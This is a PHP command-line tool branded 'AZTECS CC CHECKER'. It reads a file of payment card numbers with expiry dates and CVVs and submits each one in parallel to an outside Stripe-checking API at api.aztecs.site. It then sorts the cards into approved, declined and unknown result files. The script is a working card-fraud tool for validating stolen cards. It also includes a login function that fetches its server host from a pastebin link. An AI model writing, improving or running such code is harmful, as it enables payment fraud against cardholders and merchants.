<?php
ini_set("memory_limit",-1);
set_time_limit(0);
error_log(false);
error_reporting(false);
date_default_timezone_set("Asia/Jakarta");
define("OS", strtolower(PHP_OS));

require_once "RollingCurl/RollingCurl.php";
require_once "RollingCurl/Request.php";

echo banner();

if (!file_exists('apikey.ini')) {
    $apikey = file_get_contents('apikey.ini');
    if (empty($apikey)) {
        enter_apikey:
        $apikey = readline("Enter apikey : ");
        if(empty($apikey)) {
            echo"[?] apikey cannot be empty".PHP_EOL;
            goto enter_apikey;
        }
        file_put_contents('apikey.ini',$apikey);
    }
}else{
    $apikey = file_get_contents('apikey.ini');
    if (empty($apikey)) {
        enter_apikey2:
        $apikey = readline("Enter apikey : ");
        if(empty($apikey)) {
            echo"[?] apikey cannot be empty".PHP_EOL;
            goto enter_apikey2;
        }
        file_put_contents('apikey.ini',$apikey);
    }
}

enterlist:
$listname = readline("Enter file list (ccn|mm|yy|cvv) : ");
if(empty($listname) || !file_exists($listname)) {
    echo"[?] list not found".PHP_EOL;
    goto enterlist;
}
else if($listname == "n") {
    echo "[?] list not found".PHP_EOL;
    goto enterlist;
}
$lists = array_unique(explode("\n", str_replace("\r", "", file_get_contents($listname))));
$savedir = readline("Save Results (default: results): ");
$dir = empty($savedir) ? "results" : $savedir;
if(!is_dir($dir)) mkdir($dir);
chdir($dir);
req_request:
$requestbulk = readline("Ratio Check per second (example: max 10)? : ");
$requestbulk = (empty($requestbulk) || !is_numeric($requestbulk) || $requestbulk <= 0) ? 10 : $requestbulk;
if($requestbulk > 10) {
    echo "[!] max 10".PHP_EOL;
    goto req_request;
}
else if($requestbulk == "1") {
    echo "[!] Minimal 2".PHP_EOL;
    goto req_request;
}

$no = 0;
$total = count($lists);
$live = 0;
$dead = 0;
$unknown = 0;
$c = 0;

echo PHP_EOL;

$rollingCurl = new \RollingCurl\RollingCurl();
foreach($lists as $list) {
    $c++;
    if(empty($list)) continue;
    $rollingCurl->post("https://api.aztecs.site/stripe?list=".urlencode($list),"apikey=$apikey&list=$list&brand=AZTECS");
}
$rollingCurl->setCallback(function(\RollingCurl\Request $request, \RollingCurl\RollingCurl $rollingCurl) use (&$results) {
    global $listname, $dir, $no, $total, $live, $dead, $unknown, $apikey;
    $no++;
    parse_str(parse_url($request->getUrl(), PHP_URL_QUERY), $params);
    $list = $params["list"];
    $x = $request->getResponseText();
    $json = json_decode($x,true);

    $deletelist = 1;
    echo "[".$no."/".$total."]-[A:\33[0;32m[".$live."]\033[0m"."-D:\33[0;31m[".$dead."]\033[0m"."-U:\33[0;35m[".$unknown."]\033[0m"."";
    if (empty($json['status'])) {
        unlink('../apikey.ini');
        if (empty($json['error'])) {
            $unknown++;
            file_put_contents("UNKNOWN.txt", $list.PHP_EOL, FILE_APPEND);
            echo " | [CC CHECKER] |\33[0;35m [UNKNOWN] \033[0m"." => ".$list;
        }else{
            $unknown++;
            file_put_contents("UNKNOWN.txt", $list.PHP_EOL, FILE_APPEND);
            echo " | [CC CHECKER] |\33[0;35m [UNKNOWN - ".$json['error']."] \033[0m"." => ".$list;
        }
        exit();
    }

    if ($json['status'] == false) {
        unlink('../apikey.ini');
        if (empty($json['error'])) {
            $unknown++;
            file_put_contents("UNKNOWN.txt", $list.PHP_EOL, FILE_APPEND);
            echo " | [CC CHECKER] |\33[0;35m [UNKNOWN] \033[0m"." => ".$list;
        }else{
            $unknown++;
            file_put_contents("UNKNOWN.txt", $list.PHP_EOL, FILE_APPEND);
            echo " | [CC CHECKER] |\33[0;35m [UNKNOWN - ".$json['error']."] \033[0m"." => ".$list;
        }
        exit();
    }

    if ($json['status'] == "live"){
        $live++;
        $result = str_replace(array("<font color=green><b>","</b></font>"), "", $json['result']);
        file_put_contents("LIVE.txt", $result.PHP_EOL, FILE_APPEND);
        echo " | [CC CHECKER] |\33[0;32m [APPROVED] \033[0m"." => ".$result;
    }elseif ($json['status'] == "dead") {
        $dead++;
        $result = str_replace(array("<font color=green><b>","</b></font>"), "", $json['result']);
        file_put_contents("DECLINED.txt", $result.PHP_EOL, FILE_APPEND);
        echo " | [CC CHECKER] |\33[0;31m [DECLINED] \033[0m"." => ".$result;
    }else{
        $unknown++;
        file_put_contents("UNKNOWN.txt", $result.PHP_EOL, FILE_APPEND);
        echo " | [CC CHECKER] |\33[0;35m [UNKNOWN] \033[0m"." => ".$result;
    }
    
    
    echo PHP_EOL;
})->setSimultaneousLimit((int) $requestbulk)->execute();
echo PHP_EOL." -- Total: ".$total." - APPROVED: ".$live." - DECLINED: ".$dead." - UNKNOWN: ".$unknown." Saved to dir \"".$dir."\" -- ".PHP_EOL;

function banner() {
    $out = "======================================   

  [+] Author: AZTECS
  
  [+] Service: CC CHECKER

======================================".PHP_EOL.PHP_EOL;
  return $out;
}

function color() {
    return array(
        "LW" => (OS == "linux" ? "\e[1;37m" : ""),
        "WH" => (OS == "linux" ? "\e[0m" : ""),
        "YL" => (OS == "linux" ? "\e[1;33m" : ""),
        "LR" => (OS == "linux" ? "\e[1;31m" : ""),
        "MG" => (OS == "linux" ? "\e[0;35m" : ""),
        "LM" => (OS == "linux" ? "\e[1;35m" : ""),
        "CY" => (OS == "linux" ? "\e[1;36m" : ""),
        "LG" => (OS == "linux" ? "\e[1;32m" : ""),
        "GRN" => (OS == "linux" ? "\e[32;4m" : "")
    );
}

function getStr($source, $start, $end) {
    $a = explode($start, $source);
    $b = explode($end, $a[0]);
    return $b[0];
}

function random_array_value($arrX){
    @$randIndex = array_rand(@$arrX);
    return @$arrX[@$randIndex];
}

function inStr($s, $as){
    $s = strtoupper($s);
    if(!is_array($as)) $as=array($as);
    for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
    return false;
}

function login($username,$password) {
    $url = "https://".file_get_contents('https://pastebin.com/raw/iLGCvPfE')."/api/login";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "username=".$username."&password=".$password."&id=9");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
?>